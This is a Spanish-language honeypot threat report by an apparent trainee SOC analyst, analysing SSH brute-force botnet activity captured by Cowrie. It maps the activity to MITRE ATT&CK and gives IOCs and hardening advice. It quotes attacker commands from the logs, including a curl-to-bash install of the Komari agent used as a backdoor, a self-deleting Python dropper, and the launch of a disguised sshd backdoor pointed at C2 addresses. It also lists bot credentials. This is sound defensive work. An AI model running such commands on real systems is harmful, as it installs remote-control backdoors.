# Informe de Análisis de Amenazas — Honeypot SSH Cowrie

**Clasificación:** Uso educativo / Portafolio
**Autor:** Hans Soto — Analista SOC en formación (Blue Team)
**Tipo de sistema:** Honeypot SSH de media interacción (Cowrie 3.0.1)
**Período de captura:** ~24 horas
**Fecha del informe:** 04 de junio de 2026
**Formato de referencia:** NIST SP 800-61r2 (Computer Security Incident Handling)

---

## 1. Resumen ejecutivo

Se desplegó un honeypot SSH (Cowrie) en un servidor cloud con dirección IP pública,
con el objetivo de capturar y analizar actividad maliciosa real proveniente de
internet. En aproximadamente 24 horas de exposición, el sensor registró **359
conexiones** desde **84 direcciones IP únicas** distribuidas en al menos 9 países,
con **258 intentos de autenticación** y **62 comandos** ejecutados por los atacantes
tras obtener acceso al entorno simulado.

El análisis identificó al menos **dos campañas de malware diferenciadas**:

1. **Un módulo de propagación de botnet SSH** (escáner en Python) cuyo objetivo es
   convertir cada víctima en un nodo que escanea e infecta otros servidores.
2. **Un binario backdoor disfrazado de `sshd`** que abusa del subsistema de
   autenticación PAM y se comunica con direcciones C2 (Command & Control)
   embebidas.

Adicionalmente se observó el abuso de **Komari**, una herramienta legítima de
monitoreo de servidores, empleada como puerta trasera con capacidad de ejecución
remota de comandos — una técnica de "living-off-trusted-tools" documentada
públicamente por la industria en 2026.

La actividad capturada es consistente con **botnets automatizadas de fuerza bruta
SSH** que buscan reclutar servidores para propagación, criptominería o
infraestructura de ataque.

---

## 2. Objetivo y alcance

**Objetivo.** Construir un sensor de amenazas funcional, capturar ataques reales,
y demostrar capacidad de análisis e interpretación de la actividad maliciosa
con marco MITRE ATT&CK.

**Alcance.**
- Captura de conexiones, intentos de autenticación, comandos y archivos descargados.
- Análisis estático (sin ejecución) de las muestras capturadas.
- Correlación con MITRE ATT&CK y extracción de Indicadores de Compromiso (IOCs).

**Fuera de alcance.** Ingeniería inversa profunda de binarios en sandbox dedicado;
atribución de actor; respuesta activa (bloqueo/denuncia).

---

## 3. Arquitectura del entorno de captura

```
Atacantes (internet)
    │  puerto 22 (IP pública)
    ▼
[ Servidor cloud — Ubuntu 24.04 ]
    │  redirección a puerto interno
    ▼
[ Cowrie 3.0.1 ]  honeypot SSH de media interacción
    │  registro estructurado en JSON
    ▼
[ Pipeline automatizado ]  importación cada 5 min → base de datos
    │
    ▼
[ Dashboard de análisis ]  estadísticas, geolocalización, forense
```

**Medidas de seguridad del entorno.**
- Honeypot ejecutado bajo usuario sin privilegios.
- Acceso administrativo separado en puerto no estándar.
- Doble capa de firewall (perimetral del proveedor + iptables local).
- Servidor desechable y aislado, sin datos sensibles.
- Muestras de malware mantenidas en cuarentena, sin permisos de ejecución.

> Nota: Cowrie es un honeypot de **media interacción**: emula un sistema Linux y
> permite al atacante "entrar" y ejecutar comandos en un entorno controlado, pero
> sin acceso real al host. Esto permite observar el comportamiento post-acceso sin
> riesgo para el servidor.

---

## 4. Estadísticas de la actividad capturada

### 4.1 Volumen general (≈24 h)
| Métrica | Valor |
|---------|-------|
| Conexiones totales | 359 |
| Intentos de autenticación | 258 |
| IPs únicas | 84 |
| Comandos ejecutados | 62 |
| Archivos descargados | 9 |
| Países de origen | 9+ |

### 4.2 Distribución geográfica (top de IPs por país)
| País | IPs |
|------|-----|
| Estados Unidos | 29 |
| China | 14 |
| Países Bajos | 12 (*) |
| Reino Unido | 5 |
| Corea del Sur | 4 |
| Singapur | 3 |
| Vietnam | 2 |
| Alemania | 2 |
| Finlandia | 2 |

(*) La API de geolocalización devolvió "Netherlands" y "The Netherlands" como
etiquetas separadas; se consolidan aquí. Pendiente de normalizar en el dashboard.

**Interpretación.** El predominio de EE.UU., China y Países Bajos NO implica que los
atacantes residan allí: refleja dónde alquilan infraestructura cloud y servidores
comprometidos. Es un patrón consistente con la telemetría pública de honeypots.

### 4.3 Usuarios más intentados
| Usuario | Intentos |
|---------|----------|
| root | 166 |
| admin | 28 |
| sol | 6 |
| user | 3 |
| test | 3 |
| ubuntu | 2 |
| support | 2 |
| router | 2 |
| debian | 2 |

**Interpretación.** El 64% de los intentos apuntan a `root`, el usuario de máximo
privilegio. Es el comportamiento clásico de botnets que buscan control total
inmediato. La presencia de `router` y `xbmc` sugiere campañas dirigidas también a
dispositivos IoT / embebidos.

### 4.4 Contraseñas más intentadas
| Contraseña | Intentos | Observación |
|------------|----------|-------------|
| LeitboGi0ro | 64 | Credencial hardcodeada en familias de malware |
| 123@@@ | 43 | Patrón de campaña automatizada |
| smo@@kkklss | 25 | Credencial no humana, de bot |
| admin | 18 | Diccionario común |
| 1234 | 7 | Diccionario común |
| ubuntu | 4 | Default de distribución |
| root | 4 | Reutilización usuario=contraseña |
| password | 3 | Diccionario común |
| admin123 | 3 | Diccionario común |
| temppwd | 2 | Diccionario común |

**Interpretación clave.** Las tres contraseñas más usadas (`LeitboGi0ro`, `123@@@`,
`smo@@kkklss`) **no son credenciales que un humano elegiría**. Son cadenas
hardcodeadas en el código de familias de malware específicas. Su alta frecuencia
indica que una o pocas campañas automatizadas concentraron el ataque, no usuarios
manuales. Esto es un hallazgo relevante: el tráfico está dominado por bots con
listas de credenciales embebidas, no por fuerza bruta con diccionarios genéricos.

---

## 5. Análisis de comandos post-acceso

Una vez "dentro" del honeypot, los atacantes ejecutaron comandos que revelan sus
objetivos. Se agrupan en cuatro fases:

### Fase 1 — Reconocimiento del sistema
```
/bin/./uname -s -v -n -r -m      (10 veces)
uname -s -m                       (2 veces)
```
Identificación de kernel, arquitectura y hostname para decidir qué payload usar.
→ **MITRE T1082 — System Information Discovery**

### Fase 2 — Preparación del entorno
```
command -v python3 || (apt-get update -y && apt-get install -y python3)
command -v curl || (apt-get update -y && apt-get install -y curl)
apt-get update -y
apt-get install -y python3
```
El malware se asegura de que existan Python y curl, instalándolos si faltan, para
maximizar compatibilidad entre distribuciones.
→ **MITRE T1059 — Command and Scripting Interpreter**

### Fase 3 — Descarga y ejecución de payloads
```
bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/.../install...)
python3 /tmp/bendi.py
rm /tmp/bendi.py
```
Descarga del agente Komari desde GitHub y de un dropper Python (`bendi.py`), que se
ejecuta y se autoelimina para borrar rastros.
→ **T1105 — Ingress Tool Transfer**
→ **T1070.004 — Indicator Removal: File Deletion**

### Fase 4 — Persistencia y backdoor
```
chmod +x ./.<oculto>/sshd ; nohup ./.<oculto>/sshd <IP_C2> <IP_C2> ...
```
Ejecución de un binario disfrazado de `sshd`, alojado en carpeta oculta, lanzado con
`nohup` (sobrevive al cierre de sesión) y apuntando a IPs C2 hardcodeadas.
→ **T1036.005 — Masquerading: Match Legitimate Name**
→ **T1564.001 — Hidden Files and Directories**
→ **T1071 — Application Layer Protocol (C2)**

---

## 6. Análisis de muestras capturadas

Cowrie preservó 9 archivos en cuarentena (renombrados por su hash SHA256). Se
analizaron de forma **estática (sin ejecución)** las muestras más relevantes.

### 6.1 Muestra A — Módulo de propagación de botnet (script Python, ~28 KB)
**SHA256:** `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730`

Script de despliegue con comentarios en chino. Características observadas en el código:
- Instala un componente `ssh_scanner.py` en el directorio oculto `/root/.s/`.
- Se registra como servicio systemd `scan-runner.service` (persistencia).
- El escáner usa la librería `paramiko` (cliente SSH) y `ThreadPoolExecutor` para
  escaneo masivo y paralelo de objetivos en formato `ip:port`.

**Función.** Convierte al host infectado en un **nodo de propagación**: escanea
internet en busca de otros servidores SSH y los ataca, haciendo crecer la botnet de
forma autónoma. Es el mecanismo de auto-replicación típico de botnets tipo Mirai.

→ **T1046 — Network Service Discovery**
→ **T1021.004 — Remote Services: SSH** (movimiento lateral / propagación)
→ **T1543.002 — Create or Modify System Process: systemd service**
→ **T1564.001 — Hidden Files and Directories** (`/root/.s/`)

### 6.2 Muestra B — Backdoor SSH (binario ELF, ~11 MB)
**SHA256:** `626d05b394067eca3160ff06201fbcc44e2985129cb25e3cb4b5861077239104`

Análisis con `file` y `strings`:
- ELF 64-bit x86-64, enlazado dinámicamente.
- **Section headers eliminados** — técnica antianálisis/antiforense.
- Enlaza con **`libpam.so.0`** (subsistema de autenticación de Linux).
- Contiene una cadena larga aleatoria embebida, compatible con un token C2.

**Función probable.** Backdoor SSH / robo de credenciales: al abusar de PAM puede
interceptar el proceso de autenticación (capturar contraseñas o crear acceso
oculto). Coherente con su ejecución disfrazada de `sshd` apuntando a IPs C2.

→ **T1556 — Modify Authentication Process** (abuso de PAM)
→ **T1036.005 — Masquerading: nombre `sshd` legítimo**
→ **T1071 / T1571 — C2 a direcciones hardcodeadas**

> Limitación metodológica: la función del binario se infiere de indicadores
> estáticos (PAM + masquerading + token + C2). Una confirmación definitiva
> requeriría ingeniería inversa en sandbox aislado, fuera del alcance de este lab.

### 6.3 Contexto — Abuso de Komari (herramienta legítima)
Komari es una herramienta legítima y open-source de monitoreo de servidores.
Sin embargo, investigación pública de la industria (Huntress, abril 2026) documentó
que actores de amenaza la abusan como backdoor con privilegios de sistema: el agente
abre un canal persistente hacia el servidor de control y acepta comandos de vuelta,
lo que efectivamente proporciona ejecución remota. Desplegada masivamente, su
arquitectura "un controlador, muchos agentes" funciona como una botnet con interfaz
web limpia. El honeypot capturó un intento de instalar este agente directamente desde
GitHub — táctica de evasión basada en usar software legítimo y confiable.

---

## 7. Indicadores de Compromiso (IOCs)

> Para uso defensivo (listas de bloqueo / detección). Direcciones observadas
> distribuyendo o recibiendo tráfico malicioso durante la captura.

### IPs de origen de descargas
```
134.185.104.148
120.48.116.64
158.51.96.38
168.156.171.11
138.2.98.41
168.107.26.33
```

### IPs C2 (recibidas como argumentos del backdoor)
```
106.225.235.203
203.186.60.25
(lista parcial — truncada en el log)
```

### Hashes de muestras (SHA256)
```
00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730  (script propagación)
626d05b394067eca3160ff06201fbcc44e2985129cb25e3cb4b5861077239104  (backdoor ELF 11MB)
94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00  (binario 30MB, sin analizar)
64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b  (script, sin analizar)
b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e  (script, sin analizar)
```

### Artefactos en disco
```
/root/.s/                 (directorio oculto del escáner)
/root/.s/ssh_scanner.py   (componente de propagación)
scan-runner.service       (servicio systemd de persistencia)
/tmp/bendi.py             (dropper, autoeliminado)
./.<numero>/sshd          (backdoor disfrazado en carpeta oculta)
```

### Credenciales firma de campaña
```
LeitboGi0ro
123@@@
smo@@kkklss
```

---

## 8. Resumen de técnicas MITRE ATT&CK

| Táctica | Técnica | ID |
|---------|---------|-----|
| Initial Access | Brute Force | T1110 |
| Initial Access | Valid Accounts | T1078 |
| Discovery | System Information Discovery | T1082 |
| Discovery | Network Service Discovery | T1046 |
| Execution | Command and Scripting Interpreter | T1059 |
| Command & Control | Ingress Tool Transfer | T1105 |
| Command & Control | Application Layer Protocol | T1071 |
| Command & Control | Non-Standard Port | T1571 |
| Defense Evasion | Masquerading (Legitimate Name) | T1036.005 |
| Defense Evasion | Hidden Files and Directories | T1564.001 |
| Defense Evasion | Indicator Removal: File Deletion | T1070.004 |
| Credential Access | Modify Authentication Process (PAM) | T1556 |
| Persistence | Create/Modify System Process (systemd) | T1543.002 |
| Lateral Movement | Remote Services: SSH | T1021.004 |

---

## 9. Conclusiones

1. **La exposición a internet genera ataques en horas, no días.** Un servidor SSH
   con IP pública es escaneado y atacado casi de inmediato por botnets automatizadas.

2. **El tráfico está dominado por bots, no humanos.** Las credenciales hardcodeadas
   (`LeitboGi0ro`, etc.) y la repetición exacta de secuencias de comandos confirman
   automatización masiva.

3. **Se observó una cadena de ataque completa**, desde fuerza bruta hasta
   persistencia: acceso → reconocimiento → descarga de payload → propagación +
   backdoor. El honeypot capturó cada fase.

4. **Se capturaron componentes funcionales de botnet**: un módulo de auto-propagación
   SSH y un backdoor basado en abuso de PAM, además del abuso de una herramienta
   legítima (Komari) como C2.

5. **Valor defensivo.** Los IOCs extraídos (IPs, hashes, artefactos, credenciales)
   son insumo directo para reglas de detección y listas de bloqueo en un SOC real.

---

## 10. Recomendaciones defensivas (lecciones del análisis)

Derivadas de las técnicas observadas, aplicables a cualquier servidor SSH expuesto:

- **Deshabilitar login SSH de `root`** (`PermitRootLogin no`) — el 64% de los ataques lo buscan.
- **Usar autenticación por clave pública**, no contraseñas — anula la fuerza bruta.
- **Cambiar SSH a un puerto no estándar** reduce el ruido de escaneo automatizado.
- **Implementar fail2ban** para bloquear IPs tras intentos fallidos.
- **Monitorear creación de servicios systemd y directorios ocultos** en `/root`.
- **Vigilar procesos `sshd` anómalos** (rutas no estándar, argumentos con IPs).
- **Alimentar los IOCs** a firewalls/SIEM para detección proactiva.

---

## 11. Trabajo futuro

- Análisis de las muestras restantes (binario de 30 MB y dos scripts pendientes).
- Ingeniería inversa del backdoor en sandbox aislado para confirmar funcionalidad.
- Correlación de las IPs con fuentes de threat intel (AbuseIPDB, GreyNoise).
- Captura extendida (semanas) para análisis de tendencias y campañas.
- Enriquecimiento automático de IOCs en el dashboard.

---

## Anexo — Stack técnico del laboratorio

- **Honeypot:** Cowrie 3.0.1 (SSH/Telnet, media interacción)
- **Servidor:** VPS cloud, Ubuntu 24.04, IP pública
- **Pipeline:** Python + Django + SQLite; importación automatizada vía cron
- **Visualización:** dashboard web con geolocalización (Leaflet), gráficos (Chart.js)
  y sección forense (comandos, descargas, fingerprints)
- **Análisis estático:** `file`, `strings` (sin ejecución de muestras)
- **Marco de referencia:** MITRE ATT&CK, NIST SP 800-61r2

---

*Documento elaborado como parte de un portafolio de ciberseguridad (Blue Team / SOC).
Los datos provienen de un honeypot propio en entorno controlado y aislado.*
